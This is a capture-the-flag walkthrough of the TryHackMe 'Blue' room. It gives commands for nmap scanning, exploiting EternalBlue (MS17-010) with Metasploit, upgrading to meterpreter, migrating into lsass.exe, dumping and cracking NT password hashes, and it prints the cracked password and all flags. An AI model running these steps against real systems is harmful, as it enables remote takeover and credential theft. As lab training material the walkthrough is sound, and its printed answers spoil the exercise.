## Walkthrough of Blue machine - Try Hack Me
* This room exploits the `Eternal Blue` vuln 
* This vuln caused the `wannacry` and  `NotPetya` viruses
* `wannacry` --> ransomware
* `NotPetya`-->  Wiper(destroys the system of the victim)


### Recon
1. first lets create a file contations the ip address

```bash
echo -n "10.66.130.125" > ip.txt
```
2. use nmap to quick scan open ports
```bash
nmap -F -Pn $(cat ip.txt) -oN basic_nmap.txt
# -F ONLY SCAN DEFULT 100 PORTS
#-Pn treat host as up = skip ping scan
# -oN saved output to file
#Output:
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

```
3. lets Do a full scan
* check we didnt miss any open ports
* run the --vuln script
* make a service scan
```bash
nmap -Pn $(cat ip.txt) -sV -p- --script=vuln -T4 -oN full_nmap.txt
# -sV  service scan
# --script=vuln , check for know vulns
#-T4 speed up the scan

#Output:
*We didnt get any more port or intresting*
*scan files attached*

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).



```
* We got from `vuln` script that our victims machine is vulnerable to the `vuln-ms17-010` , this is the eternal blue vulnerability!!!

* Lets exploit this ------>
#### Q:How many ports are open with a port number under 1000?
#### A: `3`

#### Q:What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
#### A: `ms17-010`

## Exploiting
* Lets fire up msfconsole
```bash
msfconsole -q
```
1. first lets check again just to be sure that our target machine is vulnerable to this
```bash
#inside msfconsole
search type:auxiliary ms17-010
use auxiliary/scanner/smb/smb_ms17_010
set rhost $IP
#switch $IP with the target machines IP address
run
```
* We confirmed that the machine is vulnerable to ms17_010 , lets exploit it
2. 
```bash
use exploit/windows/smb/ms17_010_eternalblue
set rhost $IP
run
#might take a mintue or two
```
3. Thats it, we should have NT-AUTHORITY/SYSTEM access , that means we are admin use
    * in the room they askin you to get a normal shell not a meterpreter
    * you can upgrade the shell with backgrounding the shell and running
```bash
session $SHELL_ID -u
```
* If that doesnt work use the module shell to meterpreter

```bash
use post/multi/manage/shell_to_meterpreter 
set session $SHELL_ID 
run
```
* You should get a meterpreter shell

#### Q:Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use?
#### A:`post/multi/manage/shell_to_meterpreter`


#### Q:Select this (use MODULE_PATH). Show options, what option are we required to change?
#### A:`SESSION`
##

## cracking 
before searching the machine for flags we lets try to print all the password hash's of all the users in the system using `hashdump` 
```bash
hashdump
```
* Oh No, we get an error, why is that?
* Answer: even if we are admin user on system, the process we are running meterpreter is might not be with admin privileges
* We need to migrate the process to better one


#### Migrating
1. lets first print all running process's
```bash
# Inside meterpreter shell
ps
```
2. you see the `lsass.exe`? lets use it!
* This process is incharge of authentication and handeling user logon in windows system
* Has privileges for all hash's credentials 
* always running -> stable shell

```bash
# grab the process id of the lsass.exe process
# use the ps command
migrate $PID
```
3. Finally lets print all the user hashs
```bash
#After migrating, inside meterpreter session--->
hashdump

#Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
* Lets crack the pass for `Jon` user
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt JonHash.txt 
#Output:
alqfna22         (Jon)     
```
#### Q:What is the name of the non-default user? 
#### A: `Jon`

#### Q: What is the cracked password?
#### A: `alqfna22`


## Flags
lets find all the flags
```bash
search -f flag*
#Output: 
c:\Users\Jon\Documents\flag3.txt        
c:\Windows\System32\config\flag2.txt                           
c:\flag1.txt 

#lets cat all the flags and get our answers
cat "c:\flag1.txt" 
#flag{access_the_machine}
cat "c:\Windows\System32\config\flag2.txt" 
# flag{sam_database_elevated_access}
cat "c:\Users\Jon\Documents\flag3.txt"
# flag{admin_documents_can_be_valuable}
```



## You completed the room!!!